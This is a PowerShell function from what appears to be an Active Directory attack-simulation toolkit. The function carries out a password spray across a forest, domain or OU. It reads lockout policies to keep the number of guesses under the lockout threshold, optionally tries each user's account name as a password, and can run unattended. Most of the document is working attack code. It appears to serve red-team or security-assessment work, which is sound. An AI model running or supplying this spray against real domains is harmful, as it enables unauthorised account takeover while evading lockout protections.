<#
.SYNOPSIS
    Executes a password spray attack against Active Directory users in a specified scope.

.DESCRIPTION
    This function performs a password spray attack by attempting to authenticate multiple Active Directory users
    with one or more passwords. It provides multiple scope options (Forest, Root Domain, Current Domain, or specific OU)
    and allows the user to configure the attack parameters interactively or in unattended mode.
    
    The function performs password spray attacks using both standard authentication methods and Rubeus (if available).
    It checks domain password policies to calculate maximum safe spray attempts without locking accounts.

.PARAMETER UnAttended
    When specified, skips all interactive prompts and uses default values for automated execution.

.PARAMETER DeveloperMode
    When specified, displays additional debug information including successful credential matches.

.EXAMPLE
    PS C:\> New-PasswordSprayAttack
    Runs an interactive password spray attack with prompts for scope and password selection.

.EXAMPLE
    PS C:\> New-PasswordSprayAttack -UnAttended
    Runs an automated password spray attack using default settings (current domain, last stored password).

.NOTES
    - Requires the ActiveDirectory PowerShell module
    - Displays current domain password policies before executing the attack
    - Logs all activities and execution times
    - Supports targeting Forest, Root Domain, Current Domain, or specific OUs
    - Optional Rubeus integration for Kerberos-based attacks

.LINK
    Start-PasswordSprayAttack

#>
function New-PasswordSprayAttack {

    $CurrentFunction = Get-FunctionName
    Write-Log -Message "### Start Function $CurrentFunction ###"
    $StartRunTime = (Get-Date).ToString($Script:DateFormatLog)
    #################### main code | out- host #####################
    
    if (-not (Get-Module -ListAvailable -Name ActiveDirectory)) {
        Invoke-Output -Type  Error -M "The 'ActiveDirectory' PowerShell module is not installed."
        return
    }

    $Forest = Get-ADForest
    $Script:DoaminTypes = Get-DomainType

    $AllDomainsDetails = $Forest.Domains | ForEach-Object {
        Get-DomainPWDetails -DomainName $_
    }

    Write-Host "`nDiscovered Domain Password Policy Settings in the Forest:" -ForegroundColor $Script:FGCHighLight

    $AllDomainsDetails |
    Select-Object `
    @{N = 'Domain'; E = { $_.NetBIOSName } },
    @{N = 'DomainType'; E = { $_.DomainType } },
    @{N = 'Enabled Users'; E = { $_.EnabledUser } },
    @{N = 'Min. Pw Length'; E = { $_.MinPasswordLength } },
    @{N = 'Complexity'; E = { $_.ComplexityEnabled } },
    @{N = 'Lockout Threshold'; E = { $_.LockoutThreshold } },
    @{N = 'Lockout Duration'; E = { $_.LockoutDuration } },
    @{N = 'LockWin'; E = { $_.LockoutObservationWindow } },
    @{N = 'RevEnc'; E = { $_.ReversibleEncryptionEnabled } },
    @{N = 'FQDN'; E = { $_.DomainFQDN } } | Format-Table -AutoSize


    [int]$NoLT = ($AllDomainsDetails | 
        Where-Object { $null -ne $_.LockoutThreshold -and $_.LockoutThreshold -gt 0 } | 
        Measure-Object -Property LockoutThreshold -Minimum).Minimum

    If ($NoLT -eq 0) {

        #The number of failed logon attempts that causes a user account to be locked out is 0;
        #this means the account will NEVER be locked out.
        Write-Host "The account lockout threshold is configured to " -NoNewline
        Write-Host $NoLT -ForegroundColor $fgcH -NoNewline
        Write-Host "; as a result, user accounts will " -NoNewline
        Write-Host "never" -ForegroundColor $fgcH -NoNewline
        Write-Host " be locked out, regardless of the number of failed logon attempts.`n"
    }
    else {
        # The number of failed logon attempts that causes a user account to be locked out is [n];
        # this means you can run a maximum of [n-1] single 'Password Spray' Attacks.
        [int] $NoPS = $NoLT - 1

        Write-Host "The minimum account lockout threshold configured across all domains in the forest is " -NoNewline
        Write-Host $NoLT -ForegroundColor Yellow -NoNewline
        Write-Host " failed logon attempts."

        Write-Host "As a result, a bad actor could attempt up to " -NoNewline
        Write-Host "$NoPS "  -ForegroundColor Yellow -NoNewline
        Write-Host "passwords per account in a password-spray attack before triggering account lockout.`n"
    }



    $MaxPwLenght = ($AllDomainsDetails | 
        Where-Object { $null -ne $_.MinPasswordLength } | 
        Measure-Object -Property MinPasswordLength -Maximum).Maximum

    Write-Host "The highest minimum password length configured across all domains in this forest is " -NoNewline
    Write-Host $MaxPwLenght -ForegroundColor $fgcH -NoNewline
    Write-Host " characters.`n"

    $DomainSearchBase = Set-AttackScope -Action "Password Spray"
    If ($DomainSearchBase -eq "SKIP") { return }

    $PasswordToTest = Get-ASConfig -Setting "LastPW"

    If (-not $UnAttended) {
        $title = "Confirm or change the password for the first password spray"
        $message = "The current password is:         $PasswordToTest"
        $Options = @(
            [pscustomobject] @{
                Label = "&Keep"
                Help  = "Keep the previous password '$PasswordToTest' for the last password spray."
                Value = $Script:Yes
            },
            [pscustomobject] @{
                Label = "&Change"
                Help  = "Enter a different password for the logon attempt."
                Value = "Change"
            }
        )

        $prompt = Show-DecisionPrompt -Message $message -Options $Options -Default 0 -Title $title
    

        if ($prompt -ne $Script:Yes) {
            do {
                $PasswordToTest = Read-Host "`n  Enter new password"
                if ([string]::IsNullOrWhiteSpace($PasswordToTest)) {
                    Invoke-Output -Type Warning -Message "Please enter at least $MaxPwLenght character!"
                }
            }
            while ([string]::IsNullOrWhiteSpace($PasswordToTest) -or $PasswordToTest.Length -lt [int]$MaxPwLenght)
            Set-ASConfig -Setting "LastPW" -Value $PasswordToTest
        }
    }


   
    If (-not $UnAttended) {
        
        $title = "Attack Phase - $($Script:Phase04.toupper()) - starts now ..."
        $message = "Also test each user's samAccountName as a potential password?"
        $Options = @(
            [pscustomobject] @{ 
                Label = "&Yes"
                Help  = "Two password attempts will be performed per user:`n    1. The configured password`n    2. The user's samAccountName"
                Value = $Script:Yes 
            },
            [pscustomobject] @{ 
                Label = "&No"
                Help  = "Only the configured password will be tested."
                Value = $Script:No 
            },
            [pscustomobject] @{ 
                Label = "&Cancel"
                Help  = "Cancel whole password spray."
                Value = "Skip"
            }
        )
        $decision = Show-DecisionPrompt -Message $message  -Options $Options -Default 0 -Title $title
    }
    else {
        $decision = $Script:Yes
    }

    If ($decision -eq $Script:Yes) {
        $IncludeSamAccountNameAsPassword = $true
    }
    elseif ($decision -eq $Script:No) {
        $IncludeSamAccountNameAsPassword = $false
    }
    else {
        Invoke-Output -Type Success -Message "Password Spray cancelled by user."
        return
    }
   

    If ($DomainSearchBase -eq "All Domains in Forest") {
        $domains = (Get-ADForest).Domains
        foreach ($domain in $domains) {
            $DomainSearchBase = (Get-ADDomain -Server $domain).DistinguishedName
            $runtime = Measure-Command {
                Start-PasswordSprayAttack -SearchBase $DomainSearchBase -Password $PasswordToTest -Server $domain -IncludeSamAccountNameAsPassword:$IncludeSamAccountNameAsPassword
            }
            Write-log -Message "Finished in $($runtime.TotalSeconds) seconds."
        }
    }
    else {
        $server = Get-BestDomainController -domain $DomainSearchBase
        $runtime = Measure-Command {
            Start-PasswordSprayAttack -SearchBase $DomainSearchBase -Password $PasswordToTest -Server $server -IncludeSamAccountNameAsPassword:$IncludeSamAccountNameAsPassword 
        }
        Write-log -Message "Finished in $($runtime.TotalSeconds) seconds."
    }

    ######################## main code ############################
    $runtime = Get-RunTime -StartRunTime $StartRunTime
    Write-Log -Message "    Run Time: $runtime [h] ###"
    Write-Log -Message "### End Function $CurrentFunction ###"
}




